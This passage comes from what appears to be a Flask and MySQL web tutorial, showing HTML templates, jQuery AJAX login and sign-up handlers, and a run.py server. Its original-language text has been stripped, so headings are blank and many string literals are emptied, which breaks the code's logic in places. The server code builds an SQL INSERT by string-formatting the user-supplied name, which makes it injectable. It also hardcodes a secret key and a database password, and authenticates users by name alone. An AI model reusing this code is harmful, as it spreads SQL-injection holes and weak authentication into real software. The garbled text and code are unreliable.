class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-12.png" alt=""><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-13.png" alt=""></p><blockquote><p>templatesrun.pytemplates<br>run.py127.0.0.1:5000</p></blockquote><h3 id="4-5-"><a href="#4-5-" class="headerlink" title="4.5 "></a>4.5 </h3><h4 id="4-5-1-pythonmysql"><a href="#4-5-1-pythonmysql" class="headerlink" title="4.5.1 pythonmysql"></a>4.5.1 pythonmysql</h4><p>mysql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)<span class="comment">#</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">   <span class="comment"># cursor()</span></span><br><span class="line">   cursor = db.cursor()</span><br><span class="line">   <span class="comment"># SQL </span></span><br><span class="line">   sql = <span class="string">&quot;mysql&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">   <span class="comment"># sql</span></span><br><span class="line">   cursor.execute(sql)</span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">   db.commit()</span><br><span class="line">   results = cursor.fetchall()<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="4-5-2-"><a href="#4-5-2-" class="headerlink" title="4.5.2 "></a>4.5.2 </h4><p><a href="https://www.runoob.com/mysql/mysql-install.html"></a></p><h4 id="4-5-3-mysqlclient-python"><a href="#4-5-3-mysqlclient-python" class="headerlink" title="4.5.3 mysqlclient python"></a>4.5.3 mysqlclient python</h4><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python"></a>pythonmysqlclient<code>cmd</code>cd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xxx.whl</span><br></pre></td></tr></table></figure><p></p><h4 id="4-5-4-mysql"><a href="#4-5-4-mysql" class="headerlink" title="4.5.4 mysql"></a>4.5.4 mysql</h4><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html"></a></p><h3 id="4-6-mysql-"><a href="#4-6-mysql-" class="headerlink" title="4.6 mysql "></a>4.6 mysql </h3><h4 id="4-6-1-mysql"><a href="#4-6-1-mysql" class="headerlink" title="4.6.1 mysql"></a>4.6.1 mysql</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><code>root</code></p><h4 id="4-6-2-web"><a href="#4-6-2-web" class="headerlink" title="4.6.2.web"></a>4.6.2.<code>web</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use web;</span><br></pre></td></tr></table></figure><h4 id="4-6-3-"><a href="#4-6-3-" class="headerlink" title="4.6.3."></a>4.6.3.</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `<span class="built_in">users</span>`(</span><br><span class="line">       `uid` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">        `name` VARCHAR(100) NOT NULL,</span><br><span class="line">        `udate` DATE NOT NULL,</span><br><span class="line">        PRIMARY KEY ( `uid` )</span><br><span class="line">     )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">      ALTER TABLE <span class="built_in">users</span> ADD unique(`name`)</span><br></pre></td></tr></table></figure><p></p><ul><li>2<code>uid</code>int<code>AUTO_INCREMENT</code></li><li>3<code>name</code>varchar(100)100</li><li>4<code>udate</code></li><li>5<code>uid</code></li><li>6utf8</li><li>7</li></ul><h3 id="4-7-"><a href="#4-7-" class="headerlink" title="4.7 "></a>4.7 </h3><h4 id="4-7-1-"><a href="#4-7-1-" class="headerlink" title="4.7.1 "></a>4.7.1 </h4><p>|flask-demo<br>|-templates<br>|index.html<br>|login.html<br>|head.html<br>|-run.py</p><h4 id="4-7-2-"><a href="#4-7-2-" class="headerlink" title="4.7.2 "></a>4.7.2 </h4><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign up<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;i&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_up()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;u&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_in()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,<span class="comment">//&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;login_inurl</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_up_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data == <span class="string">&quot;haven&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sign_in</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#u&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_in_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data == <span class="string">&#x27;none&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p><br>head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jq</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">&#123;% if user %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; user &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h</span>&gt;</span>your are the &#123;&#123; uid &#125;&#125;th user in our site<span class="tag">&lt;/<span class="name">h</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;logout()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;ti&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span>&#123;&#123; users_x &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">window</span>).<span class="title function_">load</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> t = $(<span class="string">&quot;#t&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> $(<span class="string">&quot;#ti&quot;</span>).<span class="property">value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">debug</span>(key);</span></span><br><span class="line"><span class="language-javascript">            t.<span class="title function_">append</span>(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + key[<span class="number">1</span>] + <span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> + key[<span class="number">1</span>] + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: <span class="string">&quot;/login?l=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                location.<span class="title function_">reload</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;login()&quot;</span>&gt;</span>/<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>please enter your name<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login_in&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;%  endif  %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id="4-7-3-"><a href="#4-7-3-" class="headerlink" title="4.7.3 "></a>4.7.3 </h4><p>run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for, request, render_template, redirect, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta  <span class="comment"># </span></span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;files&#x27;</span>, static_url_path=<span class="string">&quot;/files&quot;</span>)</span><br><span class="line"><span class="comment"># app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(24) # SECRET_KEY </span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;sadasfas&quot;</span></span><br><span class="line"><span class="comment"># app.config[&#x27;PERMANENT_SESSION_LIFETIME&#x27;] = timedelta(days=7)  # </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    l = request.args.get(<span class="string">&#x27;l&#x27;</span>, <span class="number">0</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">    <span class="keyword">if</span> l == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, users_x=get_users(), user=session[<span class="string">&#x27;user&#x27;</span>], uid=num_user(session[<span class="string">&#x27;user&#x27;</span>]))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login_in&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_in</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;502.html&#x27;</span>)</span><br><span class="line">    u = request.args.get(<span class="string">&#x27;sign_up_name&#x27;</span>, <span class="string">&#x27;none&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> u != <span class="string">&#x27;none&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> new_user(u)</span><br><span class="line">    u = request.args.get(<span class="string">&#x27;sign_in_name&#x27;</span>, <span class="string">&#x27;none&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> u != <span class="string">&#x27;none&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> news(u)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="keyword">if</span>(num_user(namea) == <span class="string">&quot;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;none&#x27;</span>  <span class="comment"># </span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = namea</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_user</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># cursor()</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(num_user(namea) != <span class="string">&quot;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haven&quot;</span>  <span class="comment"># </span></span><br><span class="line">    <span class="comment"># SQL </span></span><br><span class="line">    sql = <span class="string">&quot;&quot;&quot;INSERT ignore INTO users(name,udate)VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;&quot;&quot;</span> % (</span><br><span class="line">        namea, time.strftime(<span class="string">r&quot;%Y-%m-%d&quot;</span>, time.localtime()))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># sql</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        db.commit()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        db.rollback()</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = namea</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_users</span>():</span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># cursor()</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># SQL </span></span><br><span class="line">    sql = <span class="string">&quot;SELECT * FROM users&quot;</span></span><br><span class="line">    <span class="comment"># sql</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    db.commit()</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 